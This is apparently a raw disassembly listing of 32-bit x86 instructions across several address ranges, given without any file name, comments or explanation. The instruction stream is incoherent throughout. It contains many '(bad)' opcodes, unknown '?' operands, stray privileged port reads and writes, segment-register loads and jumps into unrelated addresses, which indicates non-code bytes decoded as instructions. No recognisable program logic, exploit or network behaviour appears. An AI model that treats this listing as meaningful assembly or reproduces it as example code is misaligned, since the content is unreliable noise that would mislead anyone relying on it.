  424184:	cwde   
  424185:	div    dh
  424187:	inc    esi
  424188:	stos   BYTE PTR es:[edi],al
  424189:	or     eax,0xaf57572f
  42418e:	sub    bh,BYTE PTR ds:0xb47a86a
  424194:	jo     0x424173
  424196:	rcl    BYTE PTR [eax],0x36
  424199:	and    edi,DWORD PTR ds:0x6f7bece0
  42419f:	pop    es
  4241a0:	jbe    0x42412d
  4241a2:	mov    ebx,0x5377e671
  4241a7:	test   dh,dl
  4241a9:	jecxz  0x4241f3
  4241ab:	in     al,0x19
  4241ad:	or     eax,0x5761d5c
  4241b2:	jb     0x424150
  4241b4:	or     bh,al
  4241b6:	mov    ds:0x9dabe86,al
  4241bb:	push   cs
  4241bc:	mov    ebx,DWORD PTR [edx]
  4241be:	rcl    DWORD PTR [eax+0x79b42fdd],0x9b
  4241c5:	pop    es
  4241c6:	dec    ebp
  4241c7:	jmp    0x4241d7
  4241c9:	ss cld 
  4241cb:	jo     0x4241dc
  4241cd:	mov    esi,0xcf8ade8b
  4241d2:	mov    ch,0xcb
  4241d4:	icebp  
  4241d5:	dec    ebx
  4241d6:	scas   eax,DWORD PTR es:[edi]
  4241d7:	xor    ah,BYTE PTR [ebp+0x7b]
  4241da:	pop    ss
  4241db:	ins    DWORD PTR es:[edi],dx
  4241dc:	pushf  
  4241dd:	adc    al,0x84
  4241df:	fsubr  DWORD PTR [ebp-0x54]
  4241e2:	imul   esp,DWORD PTR [eax-0x2d],0x67
  4241e6:	fcom   DWORD PTR [ecx-0x43]
  4241e9:	sub    BYTE PTR [esi+eiz*4],dh
  4241ec:	leave  
  4241ed:	cwde   
  4241ee:	mov    bh,0x36
  4241f0:	adc    ch,BYTE PTR [edx-0x33e3033f]
  4241f6:	jl     0x42420d
  4241f8:	pop    edi
  4241f9:	xchg   esp,eax
  4241fa:	icebp  
  4241fb:	cld    
  4241fc:	xchg   esp,eax
  4241fd:	dec    BYTE PTR [edx+0x7623afa2]
  424203:	push   0x7c1704da
  424208:	jmpw   0xaf96
  42420c:	or     ch,BYTE PTR [ebp-0x69]
  42420f:	js     0x424211
	...
  424271:	add    BYTE PTR [eax],al
  424273:	add    BYTE PTR [edi-0x4c275c4c],al
  424279:	(bad)  
  42427b:	push   DWORD PTR [ecx+0x7]
  42427e:	sub    al,0x5c
  424280:	push   cs
  424281:	add    eax,0x81902bca
  424286:	add    DWORD PTR [eax],eax
  424288:	add    al,0x1
  42428a:	add    BYTE PTR [eax],al
  42428c:	adc    eax,0xe92bee93
  424291:	mov    esi,0xcfd85350
  424296:	mov    ds:0xaea2dfd,eax
  42429b:	lods   eax,DWORD PTR ds:[esi]
  42429c:	out    0xb2,eax
  42429e:	mov    esi,0x76349157
  4242a3:	push   ebp
  4242a4:	ins    BYTE PTR es:[edi],dx
  4242a5:	dec    ebx
  4242a6:	mov    al,ds:0xc9930ede
  4242ab:	fcomp  QWORD PTR [esi+0x12]
  4242ae:	inc    esi
  4242af:	sub    eax,0x2903d50f
  4242b4:	xchg   BYTE PTR [ebx],bl
  4242b6:	les    esp,FWORD PTR [edi-0x26965ff3]
  4242bc:	mov    eax,DWORD PTR [eax+0x61]
  4242bf:	sbb    BYTE PTR [ebx+0x589248ad],bl
  4242c5:	(bad)  
  4242c6:	out    0x2,eax
  4242c8:	dec    esp
  4242c9:	mov    bl,0xe1
  4242cb:	fmul   DWORD PTR ds:0xffb85492
  4242d1:	mov    ds:0x2f0aceb1,eax
  4242d6:	test   DWORD PTR [ecx],esp
  4242d8:	cmc    
  4242d9:	push   edx
  4242da:	nop
  4242db:	(bad)  
  4242dc:	int3   
  4242dd:	or     ah,BYTE PTR [edi+ebp*4+0x6c]
  4242e1:	test   BYTE PTR [eax-0x5],cl
  4242e4:	and    ebp,DWORD PTR ds:0xc37b45b6
  4242ea:	dec    ecx
  4242eb:	pusha  
  4242ec:	mov    ch,0xb4
  4242ee:	sub    al,0x86
  4242f0:	mov    WORD PTR [esp+ecx*2+0x5882c229],gs
  4242f7:	pop    es
  4242f8:	dec    ecx
  4242f9:	cmp    BYTE PTR es:[ecx],cl
  4242fc:	ss cli 
  4242fe:	pop    edi
  4242ff:	in     eax,0x3d
  424301:	jbe    0x42434d
  424303:	xchg   BYTE PTR [eax+0x53],al
  424306:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424307:	mov    cl,BYTE PTR [eax-0x70883777]
  42430d:	in     al,dx
  42430e:	pop    es
  42430f:	inc    esi
  424310:	pop    edx
  424311:	mov    bh,0x8b
  424313:	in     al,0x5
  424315:	fcmovbe st,st(2)
  424317:	sbb    esi,0x1b
  42431a:	or     ah,dh
  42431c:	sub    al,0x51
  42431e:	sub    eax,0x771fe
  424323:	push   eax
  424324:	mov    WORD PTR [esi+0x3c],es
  424327:	std    
  424328:	xor    BYTE PTR [ebx+0x19117ab8],0xbe
  42432f:	daa    
  424330:	pop    ds
  424331:	sub    al,0x44
  424333:	jo     0x4242eb
  424335:	imul   ecx,ebp,0x4c
  424338:	stos   DWORD PTR es:[edi],eax
  424339:	and    DWORD PTR [eax],0x2
  42433c:	sub    edi,DWORD PTR [ebx+0x2e]
  42433f:	dec    edx
  424340:	adc    ecx,DWORD PTR [ecx+0x429ce686]
  424346:	jl     0x424344
  424348:	addr16 push ecx
  42434a:	fs js  0x4242e4
  42434d:	fstp   TBYTE PTR [edx]
  42434f:	lds    eax,FWORD PTR [ebp-0x4008a23a]
  424355:	call   0x6ae3a8af
  42435a:	xchg   esp,eax
  42435b:	xlat   BYTE PTR ds:[ebx]
  42435c:	fwait
  42435d:	mov    DWORD PTR [edi+0x1b],0xd7f4e5d3
  424364:	add    DWORD PTR [esi+0x1dd89c72],0x5c47c5fa
  42436e:	and    DWORD PTR [edi],0x3601ce2d
  424374:	outs   dx,BYTE PTR ds:[esi]
  424375:	jge    0x42434a
  424377:	fidiv  WORD PTR [esi+edx*4-0x44]
  42437b:	sub    eax,0x7359d3ad
  424380:	dec    ebx
  424381:	adc    ch,BYTE PTR [eax]
  424383:	std    
  424384:	mov    esi,0xf536076d
  424389:	mov    ds:0x16df46e8,eax
  42438e:	int3   
  42438f:	fadd   QWORD PTR [eax]
	...
  4243f1:	add    BYTE PTR [eax],al
  4243f3:	add    BYTE PTR [edx-0x24582da],cl
  4243f9:	sti    
  4243fa:	iret   
  4243fb:	ss aam 0xb
  4243fe:	push   ss
  4243ff:	jno    0x424464
  424401:	mov    eax,0x829452a4
  424406:	add    DWORD PTR [eax],eax
  424408:	add    al,0x1
  42440a:	add    BYTE PTR [eax],al
  42440c:	adc    BYTE PTR [bx],al
  42440f:	mov    ebx,0xf0589000
  424414:	xchg   esi,eax
  424415:	sbb    BYTE PTR [ecx+0x29c96e9f],0xaf
  42441c:	xor    cl,BYTE PTR [esi+0x0]
  42441f:	xor    ebp,ebp
  424421:	xchg   ebp,eax
  424422:	out    dx,al
  424423:	mov    esp,DWORD PTR [ecx+0x31810097]
  424429:	mov    ebp,?
  42442b:	cmp    edi,DWORD PTR [ecx]
  42442d:	loop   0x4243e6
  42442f:	fcomp  QWORD PTR [ebx+0x47]
  424432:	neg    DWORD PTR [esi-0x50a19c7c]
  424438:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424439:	fstp   TBYTE PTR [ebx+0x4e]
  42443c:	adc    DWORD PTR [ebp+0xefd82f8],edx
  424442:	mov    edx,0xf03f47f8
  424447:	imul   esi,DWORD PTR [ebx+edx*8+0xa],0xf474792d
  42444f:	clc    
  424450:	cli    
  424451:	push   ebx
  424452:	mov    ebx,eax
  424454:	out    dx,al
  424455:	out    dx,al
  424456:	jp     0x42446b
  424458:	and    eax,0x782afafa
  42445d:	inc    eax
  42445e:	test   BYTE PTR [ebp+0x192a08d4],0x3
  424465:	jae    0x4243f6
  424467:	mov    BYTE PTR [eax-0x16],dl
  42446a:	adc    esp,ecx
  42446c:	and    ebx,ecx
  42446e:	push   0x4e363b57
  424473:	sahf   
  424474:	stos   BYTE PTR es:[edi],al
  424475:	scas   eax,DWORD PTR es:[edi]
  424476:	retf   
  424477:	dec    eax
  424478:	inc    esi
  424479:	jns    0x4244cd
  42447b:	dec    edx
  42447c:	sbb    esp,edx
  42447e:	out    dx,al
  42447f:	push   ebp
  424480:	and    al,0xd2
  424482:	scas   al,BYTE PTR es:[edi]
  424483:	data16 and BYTE PTR ds:0x92d185c4,bh
  42448a:	ficom  WORD PTR [edx]
  42448c:	or     BYTE PTR [esi],0x5b
  42448f:	ins    BYTE PTR es:[edi],dx
  424490:	clc    
  424491:	adc    ah,BYTE PTR [ecx+0x7a]
  424494:	or     eax,0xc2905267
  424499:	aad    0x26
  42449b:	rcl    BYTE PTR [eax],0xe0
  42449e:	sub    DWORD PTR [edi-0x7ca5e97d],edx
  4244a4:	cmp    esp,DWORD PTR [si-0xe4]
  4244a9:	adc    eax,0xe8edd423
  4244af:	lods   al,BYTE PTR ds:[esi]
  4244b0:	fcmovu st,st(1)
  4244b2:	mov    dl,BYTE PTR [esi+edi*4+0x7]
  4244b6:	push   ebp
  4244b7:	aaa    
  4244b8:	cmp    ebp,DWORD PTR [esi]
  4244ba:	inc    BYTE PTR [eax+0x44]
  4244bd:	push   esi
  4244be:	nop
  4244bf:	inc    edx
  4244c0:	push   cs
  4244c1:	and    BYTE PTR [edi+0x74],bl
  4244c4:	cs xchg esp,eax
  4244c6:	hlt    
  4244c7:	and    BYTE PTR [edx-0x5fce6c7c],cl
  4244cd:	mov    al,ds:0xa2854cad
  4244d2:	das    
  4244d3:	mov    ?,esp
  4244d5:	jmp    0x424532
  4244d7:	mov    ebp,0x7f95cefb
  4244dc:	jmp    0x3ccf2f6e
  4244e1:	hlt    
  4244e2:	lods   eax,DWORD PTR ds:[esi]
  4244e3:	sar    DWORD PTR [edx-0x7bc847d7],1
  4244e9:	data16 or bl,BYTE PTR [ebp-0x55]
  4244ed:	dec    ecx
  4244ee:	and    DWORD PTR [edi+0x670276d],ecx
  4244f4:	mov    edx,0xeb2f71f0
  4244f9:	cdq    
  4244fa:	mov    ds:0x92f4d861,eax
  4244ff:	push   esi
  424500:	xchg   esp,eax
  424501:	mov    ebp,0x81bbb852
  424506:	sub    ebx,esi
  424508:	jb     0x4244e7
  42450a:	ret    0x87dc
  42450d:	xor    edx,DWORD PTR [edi+0x64]
	...
  424574:	loopne 0x4245e5
  424576:	xchg   esi,eax
  424577:	inc    edx
  424578:	lahf   
  424579:	sti    
  42457a:	hlt    
  42457b:	out    dx,eax
  42457c:	dec    eax
  42457d:	rol    DWORD PTR [esp+ebx*4+0x1],1
  424581:	inc    ecx
  424582:	aas    
  424583:	sbb    DWORD PTR [eax+0x4000183],0x1
  42458a:	add    BYTE PTR [eax],al
  42458c:	pop    ebx
  42458d:	xchg   esi,eax
  42458e:	out    dx,al
  42458f:	cmp    BYTE PTR [edx-0x4c],cl
  424592:	push   esi
  424593:	or     edi,DWORD PTR [eax]
  424595:	push   ds
  424596:	mov    ch,0xb3
  424598:	sub    BYTE PTR [ecx],bl
  42459a:	shl    BYTE PTR [eax],1
  42459c:	adc    eax,0x4a36c0e6
  4245a1:	nop
  4245a2:	mov    cl,0x82
  4245a4:	sbb    eax,0x78b6f264
  4245a9:	(bad)  
  4245aa:	xchg   ecx,eax
  4245ab:	sub    eax,0x94149415
  4245b0:	fstp   QWORD PTR [ebx+ecx*2+0x726ef12a]
  4245b7:	dec    edx
  4245b8:	or     edx,DWORD PTR [ecx+eax*8+0x179fde5e]
  4245bf:	dec    edx
  4245c0:	sti    
  4245c1:	add    esp,DWORD PTR [eax-0x25]
  4245c4:	jecxz  0x42456c
  4245c6:	aad    0x9d
  4245c8:	or     eax,edx
  4245ca:	repz xchg ebx,eax
  4245cc:	pop    esi
  4245cd:	mov    bl,0x6f
  4245cf:	dec    ebp
  4245d0:	pop    esi
  4245d1:	push   eax
  4245d2:	std    
  4245d3:	mov    ebp,0x3f583f46
  4245d8:	pop    edi
  4245d9:	fnstcw WORD PTR [edx-0x70]
  4245dc:	mov    edx,0x8947a71
  4245e1:	xchg   edx,eax
  4245e2:	sub    al,0xe1
  4245e4:	cs sbb al,0xcf
  4245e7:	sub    BYTE PTR [ecx-0x636db34f],0xb7
  4245ee:	dec    ebx
  4245ef:	aaa    
  4245f0:	jbe    0x424634
  4245f2:	xor    ebp,edx
  4245f4:	add    bl,BYTE PTR [eax-0x6]
  4245f7:	ror    esi,0x87
  4245fa:	inc    ebx
  4245fb:	retf   
  4245fc:	test   DWORD PTR [edi],ebp
  4245fe:	jb     0x424597
  424600:	outs   dx,DWORD PTR ds:[esi]
  424601:	jae    0x42462e
  424603:	rol    DWORD PTR [ebx],1
  424605:	pop    ss
  424606:	cwde   
  424607:	jle    0x4245f0
  424609:	jo     0x42459a
  42460b:	test   edx,ebx
  42460d:	pop    ebx
  42460e:	jb     0x4245fe
  424610:	inc    ebx
  424611:	xchg   esp,eax
  424612:	xor    BYTE PTR [esi+edi*4],dl
  424615:	jne    0x42463d
  424617:	lock mov ds:0xe8a72e54,al
  42461d:	out    0x75,eax
  42461f:	sub    BYTE PTR [ebx+0x495ea707],0x9d
  424626:	sbb    al,0x4c
  424628:	sbb    eax,0xb6c3430
  42462d:	inc    esp
  42462e:	cmp    eax,0x1015158e
  424633:	data16 or ah,BYTE PTR [ebx]
  424636:	cmp    DWORD PTR [esi],esp
  424638:	out    0x1c,eax
  42463a:	bnd lock jo 0x424601
  42463e:	ja     0x4245ec
  424640:	ins    DWORD PTR es:[edi],dx
  424641:	into   
  424642:	leave  
  424643:	push   ss
  424644:	cmc    
  424645:	jl     0x4245d4
  424647:	cmp    eax,0xa6846f29
  42464c:	out    0x64,eax
  42464e:	hlt    
  42464f:	lahf   
  424650:	jmp    0x573f4092
  424655:	bound  edi,QWORD PTR [ebx-0x1c59c9eb]
  42465b:	int3   
  42465c:	inc    ebp
  42465d:	sub    DWORD PTR [esi+edi*4-0x19],0x53
  424662:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424663:	mov    BYTE PTR [eax],0x2f
  424666:	fimul  WORD PTR [esi+0x5c19011c]
  42466c:	lock lods al,BYTE PTR ds:[esi]
  42466e:	loope  0x424665
  424670:	xchg   ebp,eax
  424671:	imul   edx,esi,0x28874f87
  424677:	mov    bl,0x4a
  424679:	jge    0x4246a4
  42467b:	pop    es
  42467c:	or     BYTE PTR ds:0x7159eee,cl
  424682:	imul   edi,DWORD PTR ds:[ebp+0x4d],0x9ca930e5
  42468a:	adc    ecx,DWORD PTR [bx+si-0x71]
  42468e:	push   cs
  42468f:	jl     0x424691
	...
  4246f1:	add    BYTE PTR [eax],al
  4246f3:	add    BYTE PTR [edx+edx*4-0x10004],bh
  4246fa:	mov    edi,0xb298dbd3
  4246ff:	mov    BYTE PTR [edi-0x63d833ce],al
  424705:	test   BYTE PTR [ecx],al
  424707:	add    BYTE PTR [ecx+eax*1],al
  42470a:	add    BYTE PTR [eax],al
  42470c:	pop    esi
  42470d:	jns    0x4246ef
  42470f:	cs fs test al,0x2c
  424713:	xor    al,0xa8
  424715:	cmp    al,0xf0
  424717:	xchg   esi,eax
  424718:	xlat   BYTE PTR ds:[ebx]
  424719:	cld    
  42471a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42471b:	stos   BYTE PTR es:[edi],al
  42471c:	cmp    bh,0x2c
  42471f:	push   edi
  424720:	mov    edi,ecx
  424722:	mov    edx,0xcc613e73
  424727:	mov    cl,0xf1
  424729:	adc    dh,BYTE PTR [esp+eiz*8-0x76c6b955]
  424730:	ret    
  424731:	scas   eax,DWORD PTR es:[edi]
  424732:	je     0x4246b7
  424734:	lahf   
  424735:	popf   
  424736:	std    
  424737:	or     DWORD PTR [ecx-0x61],ecx
  42473a:	add    BYTE PTR [edx],dh
  42473c:	pop    ecx
  42473d:	iret   
  42473e:	mov    BYTE PTR ds:0xf442c772,0xe6
  424745:	(bad)
  424748:	and    al,0x83
  42474a:	xor    ch,ah
  42474c:	cmp    BYTE PTR [edi+0x42a275e8],bl
  424752:	ja     0x42473c
  424754:	repz pop es
  424756:	and    al,0xbb
  424758:	pop    edi
  424759:	test   DWORD PTR [ebp-0x285c6147],esp
  42475f:	adc    BYTE PTR [ebx+0x21b14ab2],dl
  424765:	adc    al,bh
  424767:	jmp    0x424751
  424769:	xor    al,BYTE PTR [edx+eax*2-0x57b3281d]
  424770:	mov    bh,0xfd
  424772:	dec    ebx
  424773:	out    0xe2,al
  424775:	dec    ecx
  424776:	inc    eax
  424777:	or     eax,0x3b2d94ce
  42477c:	out    dx,eax
  42477d:	inc    edx
  42477e:	ins    DWORD PTR es:[edi],dx
  42477f:	mov    edx,0x82042029
  424784:	in     al,0xf2
  424786:	adc    ecx,DWORD PTR [edi-0x7b5d96ac]
  42478c:	in     al,0x96
  42478e:	mov    ds:0x7a97dbb6,eax
  424793:	xchg   ebp,eax
  424794:	jge    0x424812
  424796:	xchg   edi,eax
  424797:	stos   BYTE PTR es:[edi],al
  424798:	push   esi
  424799:	push   es
  42479a:	clc    
  42479b:	retf   0x86dd
  42479e:	leave  
  42479f:	cs aas 
  4247a1:	scas   eax,DWORD PTR es:[edi]
  4247a2:	jns    0x4247e9
  4247a4:	daa    
  4247a5:	xchg   BYTE PTR [esi+0x112475fe],dh
  4247ab:	lahf   
  4247ac:	fwait
  4247ad:	imul   esi,DWORD PTR [edx-0x13],0xffffffd0
  4247b1:	scas   al,BYTE PTR es:[edi]
  4247b2:	shl    BYTE PTR [esi],cl
  4247b4:	scas   al,BYTE PTR es:[edi]
  4247b5:	jecxz  0x42476a
  4247b7:	test   al,0x34
  4247b9:	pop    edx
  4247ba:	inc    edi
  4247bb:	retf   
  4247bc:	sbb    eax,0x715b5557
  4247c1:	jg     0x4247ce
  4247c3:	push   esi
  4247c4:	test   al,0xd4
  4247c6:	sbb    al,0xb8
  4247c8:	shl    BYTE PTR [esp+edx*1+0x45],cl
  4247cc:	mov    eax,ds:0xf45eb0bc
  4247d1:	mov    dh,BYTE PTR [edx]
  4247d3:	sbb    eax,0x6d03b8a9
  4247d8:	inc    edi
  4247d9:	and    BYTE PTR ds:0x5a3ac1cd,ah
  4247df:	(bad)  
  4247e1:	xor    eax,0xbe29a6c5
  4247e6:	mov    ch,0xcf
  4247e8:	daa    
  4247e9:	push   0x272ab558
  4247ee:	mov    edi,0x32db2409
  4247f3:	sbb    al,0x9e
  4247f5:	pop    eax
  4247f6:	cmp    DWORD PTR [eax+0x22],ebx
  4247f9:	mov    al,ds:0x3fccd6c6
  4247fe:	loop   0x4247cf
  424800:	add    DWORD PTR [esi],eax
  424802:	add    al,0x9
  424804:	mov    ebx,?
  424806:	out    0xff,eax
  424808:	xchg   edi,edx
  42480a:	jo     0x424791
  42480c:	xor    al,0xab
  42480e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42480f:	stc    
	...
  424874:	and    bl,BYTE PTR [eax-0x7c]
  424877:	out    dx,eax
  424878:	(bad)  
  424879:	jmp    FWORD PTR [ebx-0x23]
  42487c:	lock test BYTE PTR [ebx],dl
  42487f:	xchg   esp,eax
  424880:	mov    ebx,0xa0505fb0
  424885:	test   DWORD PTR [ecx],eax
  424887:	add    BYTE PTR [ecx+eax*1],al
  42488a:	add    BYTE PTR [eax],al
  42488c:	add    DWORD PTR [eax+0x34],ebx
  42488f:	shl    BYTE PTR [ebx],cl
  424891:	add    ch,BYTE PTR [esi]
  424893:	sub    eax,0xd4fc7567
  424898:	push   edx
  424899:	test   al,0x35
  42489b:	arpl   WORD PTR [ebx+0x2a],bp
  42489e:	dec    edi
  42489f:	mov    esp,ebx
  4248a1:	cmp    DWORD PTR [ecx-0x4c],esp
  4248a4:	inc    esp
  4248a5:	dec    ebp
  4248a6:	cmp    BYTE PTR [ecx-0x6f],al
  4248a9:	or     ah,BYTE PTR [ebx]
  4248ab:	and    edx,DWORD PTR [eax]
  4248ad:	fild   WORD PTR [esi]
  4248af:	and    BYTE PTR [edx+0x51],bh
  4248b2:	dec    BYTE PTR [ebx+0x7a]
  4248b5:	(bad)  
  4248b6:	(bad)  
  4248b8:	sub    al,0xdd
  4248ba:	cmp    al,0xec
  4248bc:	push   edx
  4248bd:	add    al,0x27
  4248bf:	lock ja 0x424922
  4248c2:	inc    eax
  4248c3:	or     al,0xdf
  4248c5:	sahf   
  4248c6:	push   ds
  4248c7:	jle    0x42492d
  4248c9:	inc    esp
  4248ca:	mov    edx,0xe0467b4a
  4248cf:	imul   esi,DWORD PTR [edi],0x5b
  4248d2:	sub    al,0x54
  4248d4:	out    dx,eax
  4248d5:	pop    ss
  4248d6:	push   eax
  4248d7:	inc    esp
  4248d8:	stc    
  4248d9:	int3   
  4248da:	shr    dl,cl
  4248dc:	aam    0x76
  4248de:	sub    dh,BYTE PTR [ebx]
  4248e0:	pusha  
  4248e1:	fisub  WORD PTR [edi+0x8ee6714]
  4248e7:	arpl   WORD PTR [ebp+0x23],di
  4248ea:	push   esp
  4248eb:	outs   dx,DWORD PTR ds:[esi]
  4248ec:	repnz xlat BYTE PTR ds:[ebx]
  4248ee:	shr    bl,cl
  4248f0:	(bad)  
  4248f1:	adc    ah,BYTE PTR [ebp-0x1a]
  4248f4:	adc    BYTE PTR [ebp-0x1fe4f67b],cl
  4248fa:	mov    bl,0x48
  4248fc:	and    al,0xe6
  4248fe:	push   esi
  4248ff:	dec    eax
  424900:	hlt    
  424901:	add    eax,0x6bce6eee
  424906:	xchg   ebp,eax
  424907:	jno    0x42493b
  424909:	sbb    al,0xee
  42490b:	test   al,0x23
  42490d:	jb     0x424959
  42490f:	sub    edi,ecx
  424911:	mov    dh,0x88
  424913:	and    dh,al
  424915:	das    
  424916:	sub    esi,DWORD PTR [eax+0x5c]
  424919:	mov    ecx,0x614982f4
  42491e:	outs   dx,BYTE PTR ds:[esi]
  42491f:	shl    BYTE PTR [esi+0x15],cl
  424922:	nop
  424923:	push   ss
  424924:	pop    ebx
  424925:	mov    ds:0xfb9da90,eax
  42492a:	dec    ebx
  42492b:	mov    al,0x9f
  42492d:	addr16 dec esp
  42492f:	or     al,0x1a
  424931:	int3   
  424932:	push   ecx
  424933:	mov    DWORD PTR [edi-0x7955ed10],esi
  424939:	in     al,dx
  42493a:	cmp    eax,0xc7eb7a8d
  42493f:	hlt    
  424940:	mov    bh,0x6a
  424942:	enter  0x9780,0xbe
  424946:	call   0x737a3eda
  42494b:	add    eax,0x7997ac48
  424950:	jecxz  0x4248e0
  424952:	ss jge 0x424941
  424955:	cmc    
  424956:	push   ebp
  424957:	mov    al,0x93
  424959:	aam    0x78
  42495b:	int3   
  42495c:	in     al,0x7a
  42495e:	into   
  42495f:	fidivr WORD PTR [ebp+0x18176eb0]
  424965:	clc    
  424966:	and    BYTE PTR [edx-0x51],cl
  424969:	add    DWORD PTR [edi+0x41],esp
  42496c:	outs   dx,BYTE PTR ds:[esi]
  42496d:	ret    
  42496e:	inc    esi
  42496f:	pusha  
  424970:	mul    BYTE PTR [ebx]
  424972:	jno    0x42498b
  424974:	sbb    bl,BYTE PTR [ebx+0x2006f2c5]
  42497a:	xor    eax,0x49d7da19
  42497f:	leave  
  424980:	sub    eax,edx
  424982:	retf   0x45dc
  424985:	cmc    
  424986:	inc    edi
  424987:	sbb    bl,dh
  424989:	scas   eax,DWORD PTR es:[edi]
  42498a:	ret    0x7d4e
  42498d:	retf   
  42498e:	int3   
  42498f:	xchg   ebx,eax
	...
  4249f4:	imul   ebx,DWORD PTR [eax],0x63
  4249f7:	push   0x73
  4249f9:	jnp    0x424a66
  4249fb:	sbb    DWORD PTR [eax-0x5c],ecx
  4249fe:	push   esi
  4249ff:	xor    al,BYTE PTR [esi]
  424a01:	cmp    BYTE PTR [ecx+0x186a47d],dl
  424a07:	add    BYTE PTR [ecx+eax*1],al
  424a0a:	add    BYTE PTR [eax],al
  424a0c:	inc    eax
  424a0d:	pop    ebp
  424a0e:	jnp    0x424a71
  424a10:	inc    ebx
  424a11:	cwde   
  424a12:	pop    eax
  424a13:	cmp    eax,0xb0a7a7fd
  424a18:	sbb    BYTE PTR [ecx],0xb3
  424a1b:	retf   0x1b61
  424a1e:	(bad)  
  424a1f:	ins    BYTE PTR es:[edi],dx
  424a20:	and    esi,DWORD PTR [ecx]
  424a22:	cmp    ecx,DWORD PTR [ebx+0x3c8e1512]
  424a28:	mov    WORD PTR [esi-0x1b],?
  424a2b:	mov    ebx,DWORD PTR [ebp+0x3d]
  424a2e:	in     al,dx
  424a2f:	mov    eax,ecx
  424a31:	mov    ds:0x1464ff23,eax
  424a36:	mov    dl,0x87
  424a38:	pop    ds
  424a39:	sbb    dl,ch
  424a3b:	mov    dh,0x66
  424a3d:	scas   al,BYTE PTR es:[edi]
  424a3e:	es sub edx,esp
  424a41:	sbb    ah,BYTE PTR [esi-0x2f84bc95]
  424a47:	call   0xbf72:0xa1433989
  424a4e:	fwait
  424a4f:	ds int3 
  424a51:	push   edi
  424a52:	aas    
  424a53:	jg     0x424a65
  424a55:	sbb    eax,0x9dbef337
  424a5a:	loopne 0x424a59
  424a5c:	jp     0x424aaf
  424a5e:	sti    
  424a5f:	jge    0x424aad
  424a61:	icebp  
  424a62:	in     al,dx
  424a63:	mov    WORD PTR [eax],gs
  424a65:	add    ebx,DWORD PTR [ecx]
  424a67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424a68:	dec    edi
  424a69:	jge    0x424a75
  424a6b:	mov    cl,0xfb
  424a6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424a6e:	mov    dl,0x65
  424a70:	sub    BYTE PTR fs:[ecx-0x3a],0xe3
  424a75:	or     dh,BYTE PTR [esi-0xcde8b7]
  424a7b:	fldenv ds:0x55285146
  424a81:	imul   eax,DWORD PTR [edi+0xb6a4fee],0x4e
  424a88:	mov    edx,0xfb9d8462
  424a8d:	or     DWORD PTR [eax+0x13],edi
  424a90:	xlat   BYTE PTR ds:[ebx]
  424a91:	xor    eax,DWORD PTR [esi-0x1b]
  424a94:	jp     0x424aba
  424a96:	push   ecx
  424a97:	stc    
  424a98:	fst    st(5)
  424a9a:	fidivr WORD PTR [eax]
  424a9c:	xchg   DWORD PTR [ecx-0x263b0e42],ebp
  424aa2:	cdq    
  424aa3:	inc    eax
  424aa4:	inc    ecx
  424aa5:	test   edi,0x6bb78fae
  424aab:	or     eax,0xd4913584
  424ab0:	(bad)  
  424ab1:	call   0xa96622fb
  424ab6:	inc    esp
  424ab7:	mov    WORD PTR [ebx-0x4f],ds
  424aba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424abb:	loop   0x424a45
  424abd:	adc    ebx,ebp
  424abf:	inc    ecx
  424ac0:	jmp    0x424a46
  424ac2:	icebp  
  424ac3:	pop    ebx
  424ac4:	in     eax,dx
  424ac5:	nop
  424ac6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ac7:	loopne 0x424a52
  424ac9:	mov    ds:0xc132b70d,eax
  424ace:	ds dec ebx
  424ad0:	jmp    DWORD PTR [edx-0x3]
  424ad3:	mov    ecx,0x881f5e9
  424ad8:	xchg   edi,eax
  424ad9:	rol    BYTE PTR [ebp-0x2c7a2556],cl
  424adf:	adc    BYTE PTR [ebx-0xde3003c],ah
  424ae5:	mov    ebx,0x840847a9
  424aea:	ins    BYTE PTR es:[edi],dx
  424aeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424aec:	dec    esp
  424aed:	fstp   QWORD PTR [eax-0x60de12a3]
  424af3:	(bad)  
  424af5:	push   es
  424af6:	test   dh,bh
  424af8:	fcomp  DWORD PTR [ebx]
  424afa:	sbb    al,0xb2
  424afc:	imul   esp,DWORD PTR [esi+0x561cd31f],0xffffff9d
  424b03:	rol    BYTE PTR [ecx-0xaa75c95],1
  424b09:	pop    ebp
  424b0a:	pop    ds
  424b0b:	in     eax,0x4b
  424b0d:	arpl   cx,cx
  424b0f:	retf   
	...
  424b74:	push   es
  424b75:	aas    
  424b76:	or     eax,0xb6bb3db9
  424b7b:	mov    edi,0xdc50081e
  424b80:	push   0xa8a46d8e
  424b85:	xchg   DWORD PTR [ecx],eax
  424b87:	add    BYTE PTR [ecx+eax*1],al
  424b8a:	add    BYTE PTR [eax],al
  424b8c:	sub    ebp,DWORD PTR [edi]
  424b8e:	cmp    DWORD PTR [ebp-0x3acad3dd],ebp
  424b94:	or     bl,ch
  424b96:	xchg   edx,eax
  424b97:	jae    0x424b32
  424b99:	sbb    BYTE PTR [edi+0x6a0c539c],cl
  424b9f:	stc    
  424ba0:	mov    ds:0xfef4d4a,eax
  424ba5:	std    
  424ba6:	in     eax,0x7d
  424ba8:	or     al,0xe7
  424baa:	jecxz  0x424ba0
  424bac:	test   eax,0xda4714f7
  424bb1:	stos   DWORD PTR es:[edi],eax
  424bb2:	jmp    0x5942:0xb2d95066
  424bb9:	jmp    0x424c35
  424bbb:	jl     0x424bfb
  424bbd:	mov    edx,DWORD PTR [ebx+0xb]
  424bc0:	adc    al,0x44
  424bc2:	or     esi,DWORD PTR [edi+0x656299b1]
  424bc8:	mov    ecx,0x546b2761
  424bcd:	shl    BYTE PTR ds:0x819de995,cl
  424bd3:	mov    cs,esi
  424bd5:	loopne 0x424bea
  424bd7:	ins    DWORD PTR es:[edi],dx
  424bd8:	(bad)  
  424bd9:	cmp    BYTE PTR [ebx],ah
  424bdb:	dec    ebp
  424bdc:	hlt    
  424bdd:	jl     0x424beb
  424bdf:	stc    
  424be0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424be1:	cmp    BYTE PTR [esi-0x71],dl
  424be4:	clc    
  424be5:	mov    edx,0x6f55dcb1
  424bea:	xchg   edi,eax
